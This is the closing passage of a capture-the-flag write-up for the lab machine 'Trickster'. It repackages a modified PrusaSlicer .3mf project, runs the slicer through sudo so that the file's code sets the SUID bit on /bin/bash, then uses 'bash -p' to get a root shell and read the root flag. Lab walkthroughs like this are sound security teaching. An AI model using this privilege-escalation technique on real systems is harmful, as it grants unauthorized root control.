; wipe_tower_y = 140
; wiping_volumes_extruders = 70,70
; wiping_volumes_matrix = 0
; xy_size_compensation = 0
; z_offset = 0
```

After finishing the changes we `zipped` the content to get back the `.3mf` file and uploaded it back to the box.

```c
┌──(kali㉿kali)-[/media/…/Machines/Trickster/files/unzip]
└─$ zip -r TRICKSTER.3mf ./
  adding: [Content_Types].xml (deflated 45%)
  adding: Metadata/ (stored 0%)
  adding: Metadata/thumbnail.png (deflated 1%)
  adding: Metadata/Slic3r_PE.config (deflated 69%)
  adding: Metadata/Slic3r_PE_model.config (deflated 83%)
  adding: _rels/ (stored 0%)
  adding: _rels/.rels (deflated 47%)
  adding: 3D/ (stored 0%)
  adding: 3D/3dmodel.model (deflated 82%)
```

```c
┌──(kali㉿kali)-[/media/…/Machines/Trickster/files/unzip]
└─$ scp TRICKSTER.3mf james@trickster.htb:/dev/shm
james@trickster.htb's password: 
TRICKSTER.3mf
```

As last step we used the `-s` parameter according to the description in the exploit to specify the location of our `modified TRICKSTER.3mf` file.

```c
adam@trickster:~$ sudo /opt/PrusaSlicer/prusaslicer -s /dev/shm/TRICKSTER.3mf 
10 => Processing triangulated mesh
10 => Processing triangulated mesh
20 => Generating perimeters
20 => Generating perimeters
30 => Preparing infill
45 => Making infill
30 => Preparing infill
10 => Processing triangulated mesh
20 => Generating perimeters
45 => Making infill
30 => Preparing infill
10 => Processing triangulated mesh
45 => Making infill
20 => Generating perimeters
10 => Processing triangulated mesh
20 => Generating perimeters
30 => Preparing infill
45 => Making infill
30 => Preparing infill
45 => Making infill
65 => Searching support spots
65 => Searching support spots
65 => Searching support spots
65 => Searching support spots
65 => Searching support spots
69 => Alert if supports needed
print warning: Detected print stability issues:

Loose extrusions
Shape-Sphere, Shape-Sphere, Shape-Sphere, Shape-Sphere

Collapsing overhang
Shape-Sphere, Shape-Sphere, Shape-Sphere, Shape-Sphere

Low bed adhesion
TRICKSTER.HTB, Shape-Sphere, Shape-Sphere, Shape-Sphere, Shape-Sphere

Consider enabling supports.
Also consider enabling brim.
88 => Estimating curled extrusions
88 => Estimating curled extrusions
88 => Estimating curled extrusions
88 => Estimating curled extrusions
88 => Estimating curled extrusions
88 => Generating skirt and brim
90 => Exporting G-code to /dev/shm/TRICKSTER_0.4n_0.2mm_{printing_filament_types}_MK4_{print_time}.gcode
Slicing result exported to /dev/shm/TRICKSTER_0.4n_0.2mm_ABS_MK4_2h23m.gcode
```

And after the job finished we had executed our own `code` and modified the `/etc/bash` to set the `SUID bit`.

```c
adam@trickster:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

```c
adam@trickster:~$ /bin/bash -p
bash-5.1#
```

## root.txt

```c
root@trickster:~# cat root.txt
d042fa24bda3411c57f76c7616be1ce3
```

